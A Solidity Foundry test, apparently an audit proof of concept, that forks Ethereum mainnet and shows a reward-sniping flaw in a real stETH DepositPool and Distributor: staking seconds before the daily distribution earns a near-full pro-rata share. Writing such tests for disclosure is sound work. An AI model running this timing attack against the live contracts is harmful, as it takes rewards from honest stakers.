// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IStETH {
    function submit(address referral) external payable returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDepositPool {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function usersData(address, uint256)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function distributedRewards(uint256, address) external view returns (uint256);
    function minRewardsDistributePeriod() external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function depositPools(uint256, address)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

interface IPriceConsumer {
    function getPathId(string memory path_) external pure returns (bytes32);
    function getChainLinkDataFeedLatestAnswer(bytes32 pathId_) external view returns (uint256);
}

/// @notice CAP-H1 validation: DepositPool reward settlement is NOT
/// time-weighted. The Distributor releases a reward tranche at most once
/// per `minRewardsDistributePeriod` (1 day); the tranche is split across
/// stakers pro-rata by their CURRENT virtualDeposited when the pool next
/// settles. A staker who enters seconds before the distribution gate opens
/// therefore shares the whole window's accrual with stakers who were in
/// for the entire window, while a staker entering after the tranche lands
/// gets none of it. Fork state at block 26,314,439 is inside the closed
/// window (lastCalc 1793443547, gate opens +86400 s) with real accrued
/// stETH yield (balance exceeds lastUnderlyingBalance by ~0.428 stETH),
/// so the tranche distributed here is real, not simulated.
contract SettlementSnipingTest is Test {
    uint256 constant FORK_BLOCK = 26314439;
    address constant POOL = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790; // stETH DepositPool
    address constant DIST = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A; // Distributor
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    IDepositPool pool = IDepositPool(POOL);
    IDistributor dist = IDistributor(DIST);
    IStETH steth = IStETH(STETH);

    address honest = makeAddr("capH1Honest");
    address sniper = makeAddr("capH1Sniper");
    address latecomer = makeAddr("capH1Late");

    bytes32[] pathIds;
    uint256[] prices;

    function _stakeAll(address who_) internal returns (uint256 virtual_) {
        vm.deal(who_, 1_000 ether);
        vm.startPrank(who_);
        steth.submit{value: 1_000 ether}(address(0));
        uint256 bal_ = steth.balanceOf(who_);
        steth.approve(POOL, type(uint256).max); // stETH share rounding: exact-amount approval can fall 1-2 wei short
        steth.approve(DIST, type(uint256).max); // Distributor.supply pulls from the user directly (pattern from the CAP-H2/H4 tests)
        pool.stake(0, bal_, 0, address(0));
        vm.stopPrank();
        (,,,,,, virtual_,,) = pool.usersData(who_, 0);
    }

    function test_SettlementSniping() public {
        vm.createSelectFork("https://eth.drpc.org", FORK_BLOCK);
        uint128 lastCalc_ = dist.rewardPoolLastCalculatedTimestamp(0);
        uint256 gate_ = uint256(lastCalc_) + dist.minRewardsDistributePeriod();
        console.log("lastCalc:", lastCalc_);
        console.log("fork ts:", block.timestamp);
        console.log("gate opens:", gate_);
        assertLt(block.timestamp, gate_, "fork must sit inside the closed window");
        assertGt(block.timestamp, uint256(lastCalc_), "window must have started");

        // Capture every reward-pool-0 price at fork-block freshness, BEFORE
        // any warp makes the feeds stale (applied as mocks later).
        {
            address consumer_ = dist.chainLinkDataConsumer();
            address[5] memory pools_ = [
                0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790, // stETH
                0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384, // WETH
                0xdE283F8309Fd1AA46c95d299f6B8310716277A42, // WBTC
                0x6cCE082851Add4c535352f596662521B4De4750E, // USDC
                0x3B51989212BEdaB926794D6bf8e9E991218cf116 // USDT
            ];
            for (uint256 i = 0; i < pools_.length; i++) {
                (, string memory path_,,,,,, bool isExist_) = dist.depositPools(0, pools_[i]);
                if (!isExist_) continue;
                bytes32 pid_ = IPriceConsumer(consumer_).getPathId(path_);
                uint256 px_ = IPriceConsumer(consumer_).getChainLinkDataFeedLatestAnswer(pid_);
                require(px_ > 0, "price capture failed");
                pathIds.push(pid_);
                prices.push(px_);
            }
        }

        // Honest staker enters at the fork timestamp (~16.6 h before the gate).
        uint256 virtH_ = _stakeAll(honest);
        console.log("honest virtual:", virtH_);

        // Sniper enters 61 seconds before the gate opens.
        vm.warp(gate_ - 61);
        uint256 virtS_ = _stakeAll(sniper);
        console.log("sniper virtual:", virtS_);

        // Both must carry the same rate snapshot: no tranche has landed yet.
        (,, uint256 rateH_,,,,,,) = pool.usersData(honest, 0);
        (,, uint256 rateS_,,,,,,) = pool.usersData(sniper, 0);
        assertEq(rateH_, rateS_, "snapshots must be identical before distribution");
        assertEq(pool.getLatestUserReward(0, honest), 0, "no rewards before distribution");
        assertEq(pool.getLatestUserReward(0, sniper), 0, "no rewards before distribution");

        // Gate opens; anyone triggers the distribution (permissionless).
        vm.warp(gate_ + 1);
        // Scaffolding (same pattern as the CAP-H2/H4 PoCs): after the warp the
        // Chainlink feeds are stale relative to the new timestamp, so the price
        // consumer would return 0. Pin every reward-pool-0 price read to its
        // fork-block value (captured above); no protocol logic is mocked.
        address consumer_ = dist.chainLinkDataConsumer();
        for (uint256 i = 0; i < pathIds.length; i++) {
            vm.mockCall(
                consumer_,
                abi.encodeWithSelector(IPriceConsumer.getChainLinkDataFeedLatestAnswer.selector, pathIds[i]),
                abi.encode(prices[i])
            );
        }
        uint256 pushedBefore_ = dist.distributedRewards(0, POOL);
        dist.distributeRewards(0);
        uint256 tranche_ = dist.distributedRewards(0, POOL) - pushedBefore_;
        console.log("tranche to stETH pool (MOR wei):", tranche_);
        assertGt(tranche_, 0, "a real tranche must land");

        uint256 rewardH_ = pool.getLatestUserReward(0, honest);
        uint256 rewardS_ = pool.getLatestUserReward(0, sniper);
        console.log("honest reward (MOR wei):", rewardH_);
        console.log("sniper reward (MOR wei):", rewardS_);
        assertGt(rewardH_, 0, "honest staker must earn");
        assertGt(rewardS_, 0, "sniper must earn");

        // No time-weighting: the sniper's reward per virtual unit must match
        // the honest staker's (within 1% for floor dust), even though the
        // sniper was staked for 62 of the window's 86,401 seconds.
        uint256 sniperPerUnit_ = (rewardS_ * 1e18) / virtS_;
        uint256 honestPerUnit_ = (rewardH_ * 1e18) / virtH_;
        console.log("reward per virtual, sniper:", sniperPerUnit_);
        console.log("reward per virtual, honest:", honestPerUnit_);
        assertGe(sniperPerUnit_, (honestPerUnit_ * 99) / 100, "sniper must earn ~full pro-rata share");

        // Time-weighted fairness would give the sniper 62/86401 of their
        // pro-rata share. They must beat that by orders of magnitude.
        uint256 fair_ = (rewardS_ * 62) / 86401;
        console.log("sniper time-weighted fair share (MOR wei):", fair_);
        assertGe(rewardS_, fair_ * 20, "sniper reward must dwarf the time-weighted share");

        // Boundary control: entering AFTER the tranche lands earns nothing
        // from it — the window edge is the distribution event, not time in pool.
        _stakeAll(latecomer);
        assertEq(pool.getLatestUserReward(0, latecomer), 0, "latecomer must earn nothing from the tranche");
    }
}
